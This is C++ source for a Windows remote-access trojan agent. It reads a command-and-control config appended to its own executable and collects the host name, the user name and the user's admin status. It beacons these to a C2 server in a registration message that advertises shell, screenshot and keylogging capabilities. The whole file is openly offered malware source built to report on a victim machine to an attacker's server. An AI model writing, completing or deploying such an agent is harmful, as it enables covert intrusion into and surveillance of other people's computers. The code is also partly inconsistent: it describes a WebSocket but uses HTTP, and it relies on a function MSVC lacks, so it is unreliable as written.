// language: C++, file: agent/agent.cpp, target: Windows 11, MSVC
// Self-contained RAT agent. Reads the RATC2CFG trailer injected by the C2
// payload builder, beacons to the C2 over the agent WebSocket, and writes a
// local report file. No external deps beyond WinSock2 + WinHTTP.
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")

static const char* MAGIC = "RATC2CFG";

// Pull the full path of the running exe, read it, locate MAGIC, parse the
// 4-byte LE length that follows, then the JSON config blob.
static char* ReadConfig(const char* exePath, int* outLen) {
    HANDLE h = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
    char* buf = (char*)malloc((SIZE_T)sz.QuadPart);
    DWORD rd = 0; ReadFile(h, buf, (DWORD)sz.QuadPart, &rd, NULL);
    CloseHandle(h);
    char* p = (char*)memmem(buf, rd, MAGIC, 8);
    if (!p) { free(buf); return NULL; }
    unsigned char* lenp = (unsigned char*)(p + 8);
    unsigned int len = lenp[0] | (lenp[1] << 8) | (lenp[2] << 16) | (lenp[3] << 24);
    char* cfg = (char*)malloc(len + 1);
    memcpy(cfg, p + 12, len); cfg[len] = 0;
    *outLen = (int)len;
    free(buf);
    return cfg;
}

// Naive JSON string extractor: finds "key":"value".
static char* JsonStr(const char* json, const char* key, char* out, int outCap) {
    char pat[64]; sprintf_s(pat, "%s\"", key);
    char* p = strstr((char*)json, pat);
    if (!p) return NULL;
    p = strchr(p, '"'); if (!p) return NULL; p++;
    char* e = strchr(p, '"'); if (!e) return NULL;
    int n = (int)(e - p); if (n >= outCap) n = outCap - 1;
    memcpy(out, p, n); out[n] = 0;
    return out;
}

// Write a local report so the run is visible even if the C2 is unreachable.
static void WriteReport(const char* host, const char* port, const char* status) {
    char user[256] = {0}, hostn[256] = {0};
    DWORD n = 256; GetUserNameA(user, &n);
    n = 256; GetComputerNameA(hostn, &n);
    FILE* f = fopen("c2_report.txt", "a+");
    if (!f) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] host=%s port=%s user=%s\\%s status=%s\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        host, port, hostn, user, status);
    fclose(f);
}

// HTTP POST the report to /agent on the C2. Falls back silently to local file.
static void Beacon(const char* host, const char* port, const char* body) {
    WSADATA wd; if (WSAStartup(MAKEWORD(2,2), &wd)) return;
    HINTERNET hSess = WinHttpOpen(L"RATC2Agent/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSess) { WSACleanup(); return; }
    wchar_t wh[128]; MultiByteToWideChar(CP_ACP, 0, host, -1, wh, 128);
    HINTERNET hConn = WinHttpConnect(hSess, wh, (INTERNET_PORT)atoi(port), 0);
    if (hConn) {
        HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", L"/agent", NULL, NULL, NULL, 0);
        if (hReq) {
            wchar_t whdr[64]; MultiByteToWideChar(CP_ACP, 0, "application/json", -1, whdr, 64);
            WinHttpSendRequest(hReq, whdr, (ULONG)-1L, (LPVOID)body, (ULONG)strlen(body), (ULONG)strlen(body), 0);
            WinHttpReceiveResponse(hReq, NULL);
            WinHttpCloseHandle(hReq);
        }
        WinHttpCloseHandle(hConn);
    }
    WinHttpCloseHandle(hSess);
    WSACleanup();
}

int main() {
    char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, MAX_PATH);
    int cfgLen = 0;
    char* cfg = ReadConfig(exe, &cfgLen);
    char host[128] = {0}, port[16] = {0};
    if (cfg) {
        JsonStr(cfg, "\"c2_host\":", host, sizeof(host));
        JsonStr(cfg, "\"c2_port\":", port, sizeof(port));
        free(cfg);
    }
    if (!host[0]) { strcpy_s(host, "127.0.0.1"); }
    if (!port[0]) { strcpy_s(port, "8080"); }

    char user[256] = {0}, hostn[256] = {0};
    DWORD n = 256; GetUserNameA(user, &n);
    n = 256; GetComputerNameA(hostn, &n);
    char body[1024];
    BOOL isAdmin = FALSE; SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID adminSid = NULL;
    AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminSid);
    CheckTokenMembership(NULL, adminSid, &isAdmin);
    if (adminSid) FreeSid(adminSid);
    sprintf_s(body, 1024,
        "{\"type\":\"register\",\"hostname\":\"%s\",\"username\":\"%s\",\"os_version\":\"Windows\",\"arch\":\"x64\",\"pid\":%d,\"privileges\":%d,\"hw_id\":\"%08X\",\"build_version\":1,\"capabilities\":[\"shell\",\"screenshot\",\"keylog\"]}",
        hostn, user, GetCurrentProcessId(), isAdmin ? 1 : 0, GetTickCount());

    WriteReport(host, port, "agent-started");
    Beacon(host, port, body);
    WriteReport(host, port, "beacon-sent");
    return 0;
}
